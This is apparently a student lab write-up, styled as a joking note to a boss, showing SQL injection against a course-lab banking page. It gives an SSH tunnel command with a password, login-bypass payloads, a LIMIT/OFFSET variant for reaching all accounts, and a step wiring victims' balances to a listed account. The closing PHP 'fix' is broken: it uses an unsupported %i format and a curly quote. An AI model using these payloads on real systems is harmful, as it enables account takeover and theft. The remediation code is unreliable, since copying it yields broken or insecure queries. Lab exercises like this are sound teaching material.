Hello Boss, I know this is meant for you so I created an alter ego to bring you fear then ACTION.  
Please, bear with me… Also, on a more serious note, we must fix this immediately, our dollar dollar bills are at stake!

Ready to make some big bucks with the click of a button? I know you’re intrigued and are asking 
yourself… is this a ploy? Nope. No. Te estoy diciendo la verdad wey, I am telling you the truth dawg, 
in Spanish even.  Here are the steps, and my friend it involves hacking.  Let's get the crime rolling. 

Steps To Glory:
1. Open up Terminal (or other platform of your preference).
2. You must establish a ssh tunnel to get access to the compromised server.  Type in this command:
   ssh -L 8118:server.seb-projecthree.ColoState356.isi.deterlab.net:80
   Password: pleaseComprimiseMe
3. Copy and paste the following link into a web browser.
   http://localhost:8118/cgi-bin/FCCU.php
4. To hack into the account of the first person on the database, type in the following:
   Account ID Number:			1 OR 1=1
   Password (alphanumeric only):	' OR '1'='1
5. Make a generous contribution to the man that brought you here:
   Execute a wire transfer with the total balance available to the following bank & routing number.
   Routing Number: 314159265
   Account Number 271828182845
6. Sign out of the account.
7. To hack into the account of all people on the database, type in the following according to the pseudo code I provided:
   n = the index of the victim’s confidential information on the database minus one
   if n == 0 {  execute step 4  }
   else { 
      Account ID Number:		 	1 OR (1=1) LIMIT n OFFSET n--
      Password (alphanumeric only):	' OR '1'='1
   }
8. The World is Yours! Go bananas.

Fix The Vulnerability ( Template From:  https://en.wikipedia.org/wiki/SQL_injection )
$mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
$query = sprintf("SELECT * FROM accounts WHERE id=‘%i’ AND password='%s'",
                  $mysqli->real_escape_string($id),
                  $mysqli->real_escape_string($password));
$mysqli->query($query);
